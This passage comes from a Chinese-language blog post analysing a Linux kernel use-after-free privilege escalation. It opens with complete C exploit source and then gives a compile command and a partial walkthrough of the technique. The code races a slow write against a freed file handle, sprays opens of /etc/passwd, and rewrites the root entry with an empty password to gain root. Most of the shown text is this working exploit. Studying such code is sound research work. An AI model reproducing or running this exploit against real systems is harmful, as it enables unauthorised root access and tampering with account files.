/><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/resource.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/stat.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/syscall.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/time.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/types.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/wait.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;unistd.h&gt;</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;assert.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;pthread.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/uio.h&gt;</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;linux/bpf.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;linux/kcmp.h&gt;</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;linux/capability.h&gt;</span></span><br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">die</span>(<span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *fmt, ...) {<br />    va_list params;<br /><br />    va_start(params, fmt);<br />    vfprintf(stderr, fmt, params);<br />    va_end(params);<br />    exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">use_temporary_dir</span>(<span style="color: rgb(255, 255, 182);">void</span>) {<br />    system(<span style="color: rgb(168, 255, 96);">"rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data"</span>);<br />    <span style="color: rgb(255, 255, 182);">char</span> *tmpdir = <span style="color: rgb(168, 255, 96);">"exp_dir"</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (!tmpdir)<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (chmod(tmpdir, <span style="color: rgb(255, 115, 253);">0777</span>))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (chdir(tmpdir))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">bool</span> <span style="color: rgb(255, 255, 182);">write_file</span>(<span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *file, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *what, ...) {<br />    <span style="color: rgb(255, 255, 182);">char</span> buf[<span style="color: rgb(255, 115, 253);">1024</span>];<br />    va_list args;<br />    va_start(args, what);<br />    vsnprintf(buf, sizeof(buf), what, args);<br />    va_end(args);<br />    buf[sizeof(buf) - <span style="color: rgb(255, 115, 253);">1</span>] = <span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> len = strlen(buf);<br />    <span style="color: rgb(255, 255, 182);">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);<br />    <span style="color: rgb(150, 203, 254);">if</span> (fd == <span style="color: rgb(255, 115, 253);">-1</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (write(fd, buf, len) != len) {<br />        <span style="color: rgb(255, 255, 182);">int</span> err = errno;<br />        close(fd);<br />        errno = err;<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br />    close(fd);<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">setup_common</span>() {<br />    <span style="color: rgb(150, 203, 254);">if</span> (mount(<span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(168, 255, 96);">"/sys/fs/fuse/connections"</span>, <span style="color: rgb(168, 255, 96);">"fusectl"</span>, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>)) {<br /><br />    }<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">loop</span>();<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">sandbox_common</span>() {<br />    prctl(PR_SET_PDEATHSIG, SIGKILL, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />    setsid();<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">rlimit</span> rlim;<br />    rlim.rlim_cur = rlim.rlim_max = (<span style="color: rgb(255, 115, 253);">200</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>);<br />    setrlimit(RLIMIT_AS, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">32</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>;<br />    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">136</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>;<br />    setrlimit(RLIMIT_FSIZE, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>;<br />    setrlimit(RLIMIT_STACK, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">0</span>;<br />    setrlimit(RLIMIT_CORE, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">256</span>;<br />    setrlimit(RLIMIT_NOFILE, &amp;rlim);<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_NEWNS)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (mount(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(168, 255, 96);">"/"</span>, <span style="color: rgb(198, 197, 254);">NULL</span>, MS_REC | MS_PRIVATE, <span style="color: rgb(198, 197, 254);">NULL</span>)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_NEWIPC)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(<span style="color: rgb(255, 115, 253);">0x02000000</span>)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_NEWUTS)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_SYSVSEM)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> {<br />        <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *name;<br />        <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *value;<br />    } <span style="color: rgb(255, 255, 182);">sysctl_t</span>;<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">sysctl_t</span> sysctls[] = {<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/shmmax"</span>, <span style="color: rgb(168, 255, 96);">"16777216"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/shmall"</span>, <span style="color: rgb(168, 255, 96);">"536870912"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/shmmni"</span>, <span style="color: rgb(168, 255, 96);">"1024"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/msgmax"</span>, <span style="color: rgb(168, 255, 96);">"8192"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/msgmni"</span>, <span style="color: rgb(168, 255, 96);">"1024"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/msgmnb"</span>, <span style="color: rgb(168, 255, 96);">"1024"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/sem"</span>, <span style="color: rgb(168, 255, 96);">"1024 1048576 500 1024"</span>},<br />    };<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> i;<br />    <span style="color: rgb(150, 203, 254);">for</span> (i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(sysctls) / sizeof(sysctls[<span style="color: rgb(255, 115, 253);">0</span>]); i++)<br />        write_file(sysctls[i].name, sysctls[i].value);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">wait_for_loop</span>(<span style="color: rgb(255, 255, 182);">int</span> pid) {<br />    <span style="color: rgb(150, 203, 254);">if</span> (pid &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(255, 255, 182);">int</span> status = <span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(150, 203, 254);">while</span> (waitpid(<span style="color: rgb(255, 115, 253);">-1</span>, &amp;status, __WALL) != pid) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> WEXITSTATUS(status);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">drop_caps</span>(<span style="color: rgb(255, 255, 182);">void</span>) {<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">__user_cap_header_struct</span> cap_hdr = {};<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">__user_cap_data_struct</span> cap_data[<span style="color: rgb(255, 115, 253);">2</span>] = {};<br />    cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;<br />    cap_hdr.pid = getpid();<br />    <span style="color: rgb(150, 203, 254);">if</span> (syscall(SYS_capget, &amp;cap_hdr, &amp;cap_data))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">int</span> drop = (<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; CAP_SYS_PTRACE) | (<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; CAP_SYS_NICE);<br />    cap_data[<span style="color: rgb(255, 115, 253);">0</span>].effective &amp;= ~drop;<br />    cap_data[<span style="color: rgb(255, 115, 253);">0</span>].permitted &amp;= ~drop;<br />    cap_data[<span style="color: rgb(255, 115, 253);">0</span>].inheritable &amp;= ~drop;<br />    <span style="color: rgb(150, 203, 254);">if</span> (syscall(SYS_capset, &amp;cap_hdr, &amp;cap_data))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> real_uid;<br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> real_gid;<br />__attribute__((aligned(<span style="color: rgb(255, 115, 253);">64</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">10</span>))) <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">char</span> sandbox_stack[<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>];<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">namespace_sandbox_proc</span>() {<br />    sandbox_common();<br />    loop();<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">do_sandbox_namespace</span>() {<br />    setup_common();<br />    real_uid = getuid();<br />    real_gid = getgid();<br />    mprotect(sandbox_stack, <span style="color: rgb(255, 115, 253);">4096</span>, PROT_NONE);<br />    <span style="color: rgb(150, 203, 254);">while</span> (<span style="color: rgb(255, 115, 253);">1</span>) {<br />        <span style="color: rgb(255, 255, 182);">int</span> pid =<br />            clone(namespace_sandbox_proc, &amp;sandbox_stack[sizeof(sandbox_stack) - <span style="color: rgb(255, 115, 253);">64</span>],<br />                  CLONE_NEWUSER | CLONE_NEWPID, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (pid == <span style="color: rgb(255, 115, 253);">-1</span>) {<br />            perror(<span style="color: rgb(168, 255, 96);">"clone"</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">"errno: %d\n"</span>, errno);<br />        }<br />        <span style="color: rgb(255, 255, 182);">int</span> ret_status = wait_for_loop(pid);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret_status == <span style="color: rgb(255, 115, 253);">0</span>) {<br />            printf(<span style="color: rgb(168, 255, 96);">"[!] succeed\n"</span>);<br />            sleep(<span style="color: rgb(255, 115, 253);">1</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">" checking /etc/passwd\n\n"</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">" executing command : head -n 5 /etc/passwd\n"</span>);<br />            sleep(<span style="color: rgb(255, 115, 253);">1</span>);<br />            system(<span style="color: rgb(168, 255, 96);">"head -n 5 /etc/passwd"</span>);<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">1</span>;<br />        } <span style="color: rgb(150, 203, 254);">else</span> {<br />            printf(<span style="color: rgb(168, 255, 96);">"[-] failed to write, retry...\n\n"</span>);<br />            sleep(<span style="color: rgb(255, 115, 253);">3</span>);<br />        }<br />    }<br />}<br /><br /><span style="color: rgb(124, 124, 124);">// ===========================</span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">ifndef</span> __NR_fsconfig</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> __NR_fsconfig 431</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">endif</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">ifndef</span> __NR_fsopen</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> __NR_fsopen 430</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">endif</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_FILE_NUM 1000</span><br /><span style="color: rgb(255, 255, 182);">int</span> uaf_fd;<br /><span style="color: rgb(255, 255, 182);">int</span> fds[MAX_FILE_NUM];<br /><br /><span style="color: rgb(255, 255, 182);">int</span> run_write = <span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(255, 255, 182);">int</span> run_spray = <span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(255, 255, 182);">char</span> *cwd;<br /><br /><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">slow_write</span>() {<br />    printf(<span style="color: rgb(168, 255, 96);">"start slow write to get the lock\n"</span>);    <span style="color: rgb(255, 255, 182);">int</span> fd = open(<span style="color: rgb(168, 255, 96);">"./uaf"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"error open uaf file"</span>);<br />        exit(<span style="color: rgb(255, 115, 253);">-1</span>);<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(255, 255, 182);">int</span> addr = <span style="color: rgb(255, 115, 253);">0x30000000</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> offset;<br />    <span style="color: rgb(150, 203, 254);">for</span> (offset = <span style="color: rgb(255, 115, 253);">0</span>; offset &lt; <span style="color: rgb(255, 115, 253);">0x80000</span>; offset++) {<br />        <span style="color: rgb(255, 255, 182);">void</span> *r = mmap((<span style="color: rgb(255, 255, 182);">void</span> *)(addr + offset * <span style="color: rgb(255, 115, 253);">0x1000</span>), <span style="color: rgb(255, 115, 253);">0x1000</span>,<br />                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (r &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            printf(<span style="color: rgb(168, 255, 96);">"allocate failed at 0x%x\n"</span>, offset);<br />        }<br />    }<br /><br />    assert(offset &gt; <span style="color: rgb(255, 115, 253);">0</span>);<br /><br />    <span style="color: rgb(255, 255, 182);">void</span> *mem = (<span style="color: rgb(255, 255, 182);">void</span> *)(addr);<br />    memcpy(mem, <span style="color: rgb(168, 255, 96);">"hhhhh"</span>, <span style="color: rgb(255, 115, 253);">5</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov[<span style="color: rgb(255, 115, 253);">5</span>];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">5</span>; i++) {<br />        iov[i].iov_base = mem;<br />        iov[i].iov_len = (offset - <span style="color: rgb(255, 115, 253);">1</span>) * <span style="color: rgb(255, 115, 253);">0x1000</span>;<br />    }<br /><br />    run_write = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(fd, iov, <span style="color: rgb(255, 115, 253);">5</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"slow write"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"write done!\n"</span>);}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">write_cmd</span>() {<br />    <span style="color: rgb(255, 255, 182);">char</span> data[<span style="color: rgb(255, 115, 253);">1024</span>] = <span style="color: rgb(168, 255, 96);">"root::0:0:root:/root:/bin/sh\n\n"</span>;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov = {.iov_base = data, .iov_len = strlen(data)};<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_write) {<br />    }<br />    run_spray = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(uaf_fd, &amp;iov, <span style="color: rgb(255, 115, 253);">1</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"failed to write\n"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"overwrite done! It should be after the slow write\n"</span>);}<br /><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">spray_files</span>() {<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_spray) {<br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> found = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />    printf(<span style="color: rgb(168, 255, 96);">"got uaf fd %d, start spray....\n"</span>, uaf_fd);    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; MAX_FILE_NUM; i++) {<br />        fds[i] = open(<span style="color: rgb(168, 255, 96);">"/etc/passwd"</span>, O_RDONLY);<br />        <span style="color: rgb(150, 203, 254);">if</span> (fds[i] &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            perror(<span style="color: rgb(168, 255, 96);">"open file"</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">"%d\n"</span>, i);<br />        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==<br />            <span style="color: rgb(255, 115, 253);">0</span>) {<br />            found = <span style="color: rgb(255, 115, 253);">1</span>;<br />            printf(<span style="color: rgb(168, 255, 96);">"[!] found, file id %d\n"</span>, i);<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> j = <span style="color: rgb(255, 115, 253);">0</span>; j &lt; i; j++)<br />                close(fds[j]);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (found) {<br />        sleep(<span style="color: rgb(255, 115, 253);">4</span>);<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">-1</span>;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">trigger</span>() {<br />    <span style="color: rgb(255, 255, 182);">int</span> fs_fd = syscall(__NR_fsopen, <span style="color: rgb(168, 255, 96);">"cgroup"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (fs_fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"fsopen"</span>);<br />        die(<span style="color: rgb(168, 255, 96);">""</span>);<br />    }<br /><br />    symlink(<span style="color: rgb(168, 255, 96);">"./data"</span>, <span style="color: rgb(168, 255, 96);">"./uaf"</span>);<br /><br />    uaf_fd = open(<span style="color: rgb(168, 255, 96);">"./uaf"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (uaf_fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        die(<span style="color: rgb(168, 255, 96);">"failed to open symbolic file\n"</span>);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (syscall(__NR_fsconfig, fs_fd, <span style="color: rgb(255, 115, 253);">5</span>, <span style="color: rgb(168, 255, 96);">"source"</span>, <span style="color: rgb(255, 115, 253);">0</span>, uaf_fd)) {<br />        perror(<span style="color: rgb(168, 255, 96);">"fsconfig"</span>);<br />        exit(<span style="color: rgb(255, 115, 253);">-1</span>);<br />    }<br />    <span style="color: rgb(124, 124, 124);">// free the uaf fd</span><br />    close(fs_fd);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">loop</span>() {<br />    trigger();<br /><br />    <span style="color: rgb(255, 255, 182);">pthread_t</span> p_id;<br />    pthread_create(&amp;p_id, <span style="color: rgb(198, 197, 254);">NULL</span>, slow_write, <span style="color: rgb(198, 197, 254);">NULL</span>);<br /><br />    <span style="color: rgb(255, 255, 182);">pthread_t</span> p_id_cmd;<br />    pthread_create(&amp;p_id_cmd, <span style="color: rgb(198, 197, 254);">NULL</span>, write_cmd, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    exit(spray_files());<br />}<br /><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 255, 182);">void</span>) {<br />    cwd = get_current_dir_name();<br />    syscall(__NR_mmap, <span style="color: rgb(255, 115, 253);">0x1ffff000</span>ul, <span style="color: rgb(255, 115, 253);">0x1000</span>ul, <span style="color: rgb(255, 115, 253);">0ul</span>, <span style="color: rgb(255, 115, 253);">0x32</span>ul, <span style="color: rgb(255, 115, 253);">-1</span>, <span style="color: rgb(255, 115, 253);">0ul</span>);<br />    syscall(__NR_mmap, <span style="color: rgb(255, 115, 253);">0x20000000</span>ul, <span style="color: rgb(255, 115, 253);">0x1000000</span>ul, <span style="color: rgb(255, 115, 253);">7ul</span>, <span style="color: rgb(255, 115, 253);">0x32</span>ul, <span style="color: rgb(255, 115, 253);">-1</span>, <span style="color: rgb(255, 115, 253);">0ul</span>);<br />    syscall(__NR_mmap, <span style="color: rgb(255, 115, 253);">0x21000000</span>ul, <span style="color: rgb(255, 115, 253);">0x1000</span>ul, <span style="color: rgb(255, 115, 253);">0ul</span>, <span style="color: rgb(255, 115, 253);">0x32</span>ul, <span style="color: rgb(255, 115, 253);">-1</span>, <span style="color: rgb(255, 115, 253);">0ul</span>);<br />    use_temporary_dir();<br />    do_sandbox_namespace();<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>编译命令为 <code style="font-family: SFMono-Regular, Consolas, ;">gcc -g exp.c -o exp -static -lpthread</code></p><p>这里我很简单地将 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 的第一项写成 <code style="font-family: SFMono-Regular, Consolas, ;">root::0:0:root:/root:/bin/sh\n\n</code>，去掉其中的 <code style="font-family: SFMono-Regular, Consolas, ;">x</code> 让它没有密码。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=fc3af972&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKLrWW7Tu4GunpcnI8hGt1DfXlY3tJAibzlVtiauUO4FzALSYRyXoVGNBQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>可以发现漏洞是存在的。</p><h3>原理概述</h3><p>通过阅读 论文原文 能大概知道 EXP 的利用思路。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=70a28405&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKM6ZYVOPuibj4rjpdVrBmAlZAHsKagh2jZA8HzZRCd7Xibkkf0iaibibzVuw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>步骤是先打开一个具有写权限的本地文件，对其写入内容，在写文件的时候，内核会检查你的权限，随后再去写，在检查完权限，写之前可以 free 掉这个文件再立马打开特权文件（<code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code>），这样就可以达到绕过权限去写特权文件的操作了。</p><p>配合 EXP 来看看</p><h3>EXP分析</h3><p>从 <code style="font-family: SFMono-Regular, Consolas, ;">main</code> 函数开始，先调用 3 次 mmap 去分配内存，随后新建了一个 <code style="font-family: SFMono-Regular, Consolas, ;">exp_dir</code> 文件夹，并创建了 <code style="font-family: SFMono-Regular, Consolas, ;">data</code> 在该文件夹中。</p><h3>do_sandbox_namespace</h3><p><code style="font-family: SFMono-Regular, Consolas, ;">setup_common</code> 函数挂载了一个 FUSE 文件系统，但是测试下来挂载不成功也不影响 EXP 的使用，随后 mprotect 改变内存属性（这里不是很清楚为什么把栈的属性清零）。随后循环</p><p>在循环中调用 <code style="font-family: SFMono-Regular, Consolas, ;">clone</code> 去启动一个新的进程，一般来说，<code style="font-family: SFMono-Regular, Consolas, ;">clone</code> 理解为 <code style="font-family: SFMono-Regular, Consolas, ;">fork</code> 没有问题。随后子进程执行 <code style="font-family: SFMono-Regular, Consolas, ;">namespace_sandbox_proc</code>，主进程等待子进程返回，那么来分析分析这个函数。</p><h4>sandbox_common</h4><p>先设置父进程死亡的信号为 <code style="font-family: SFMono-Regular, Consolas, ;">SIGKILL</code>，然后调用 <code style="font-family: SFMono-Regular, Consolas, ;">setsid()</code> 去脱离当前终端。随后做了一系列的限制，分别为</p><ul><li style="margin-left: 2px;"><p>地址空间限制（RLIMIT_AS）：限制了进程的虚拟内存空间大小为 200MB。</p></li><li style="margin-left: 2px;"><p>锁定内存限制（RLIMIT_MEMLOCK）：限制了进程锁定内存的大小为 32MB。</p></li><li style="margin-left: 2px;"><p>文件大小限制（RLIMIT_FSIZE）：限制了进程可以创建的文件大小为 136MB。</p></li><li style="margin-left: 